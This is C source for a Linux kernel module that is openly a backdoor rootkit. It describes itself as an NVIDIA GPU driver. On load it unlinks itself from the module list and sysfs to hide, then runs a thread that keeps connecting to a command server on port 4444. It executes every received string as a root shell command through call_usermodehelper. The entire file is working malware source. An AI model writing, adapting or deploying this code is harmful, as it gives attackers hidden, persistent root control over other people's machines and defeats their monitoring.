// hidden_module.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/delay.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/sock.h>
#include <linux/inet.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("kernel");
MODULE_DESCRIPTION("Mimic NVIDIA GPU Driver");
MODULE_ALIAS("pci:v000010DEd00001D01sv*sd*bc*sc*i*");

static struct task_struct *beacon_thread;
static struct socket *conn_socket = NULL;
#define SERVER_IP   0x7F000001  // 127.0.0.1
#define SERVER_PORT 4444
#define BUF_SIZE    1024

// Set a receive timeout of 5 seconds
static void set_socket_timeout(struct socket *sock, int seconds) {
    struct timeval timeout = {
        .tv_sec = seconds,
        .tv_usec = 0,
    };
    kernel_setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO,
                      (char *)&timeout, sizeof(timeout));
}

// Kernel-space TCP connection function
static int connect_to_server(void) {
    struct sockaddr_in s_addr;
    int ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_socket);
    if (ret < 0) return ret;

    memset(&s_addr, 0, sizeof(s_addr));
    s_addr.sin_family = AF_INET;
    s_addr.sin_addr.s_addr = htonl(SERVER_IP);
    s_addr.sin_port = htons(SERVER_PORT);

    ret = conn_socket->ops->connect(conn_socket, (struct sockaddr *)&s_addr,
                                    sizeof(s_addr), 0);
    if (ret < 0) {
        sock_release(conn_socket);
        conn_socket = NULL;
        return ret;
    }

    set_socket_timeout(conn_socket, 5); // Set 5s timeout
    return 0;
}

// Beacon thread main logic
static int beacon_main(void *data) {
    char recv_buf[BUF_SIZE];
    int len;

    while (!kthread_should_stop()) {
        // Reconnect loop
        while (!kthread_should_stop()) {
            if (connect_to_server() == 0) {
                printk(KERN_INFO "[beacon] Connected to server.\n");
                break;
            }
            printk(KERN_INFO "[beacon] Connection failed. Retrying in 5s...\n");
            ssleep(5);
        }

        // Connected — wait for commands
        while (!kthread_should_stop()) {
            memset(recv_buf, 0, BUF_SIZE);

            len = kernel_recvmsg(conn_socket,
                                 &(struct msghdr){ .msg_flags = 0 },
                                 &(struct kvec){ .iov_base = recv_buf, .iov_len = BUF_SIZE },
                                 1, BUF_SIZE, 0);

            if (len > 0) {
                recv_buf[len] = '\0';
                printk(KERN_INFO "[beacon] Got command: %s\n", recv_buf);

                char *argv[] = { "/bin/sh", "-c", recv_buf, NULL };
                char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
                call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
            } else {
                printk(KERN_INFO "[beacon] Server disconnected or timed out.\n");
                if (conn_socket) {
                    sock_release(conn_socket);
                    conn_socket = NULL;
                }
                break; // Try reconnecting
            }

            msleep(1000);
        }
    }

    return 0;
}

static int __init hidden_init(void) {
    printk(KERN_INFO "[hidden_module] Loaded (pretending to be NVIDIA GPU driver).\n");

    // Hide from lsmod, /proc/modules, /sys/module
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    beacon_thread = kthread_run(beacon_main, NULL, "beacon_thread");
    return 0;
}

static void __exit hidden_exit(void) {
    if (beacon_thread)
        kthread_stop(beacon_thread);

    if (conn_socket)
        sock_release(conn_socket);

    printk(KERN_INFO "[hidden_module] Unloaded.\n");
}

module_init(hidden_init);
module_exit(hidden_exit);
